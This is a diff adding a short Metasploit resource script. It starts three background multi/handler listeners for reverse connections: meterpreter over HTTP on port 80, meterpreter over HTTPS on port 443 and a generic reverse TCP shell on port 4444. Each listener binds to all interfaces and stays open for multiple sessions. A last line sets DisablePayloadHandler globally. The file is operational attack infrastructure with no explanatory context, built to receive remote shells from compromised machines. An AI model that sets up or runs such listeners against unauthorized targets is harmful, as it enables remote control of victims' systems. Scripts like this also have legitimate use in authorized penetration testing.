@@ -1,0 +1,23 @@
+use exploit/multi/handler
+set PAYLOAD multi/meterpreter/reverse_http
+set LPORT 80
+set LHOST 0.0.0.0
+set ExitOnSession false
+exploit -j
+
+use exploit/multi/handler
+set PAYLOAD multi/meterpreter/reverse_https
+set LPORT 443
+set LHOST 0.0.0.0
+set ExitOnSession false
+exploit -j
+
+
+use exploit/multi/handler
+set PAYLOAD generic/shell_reverse_tcp
+set LPORT 4444
+set LHOST 0.0.0.0
+set ExitOnSession false
+exploit -j
+
+set -g DisablePayloadHandler true
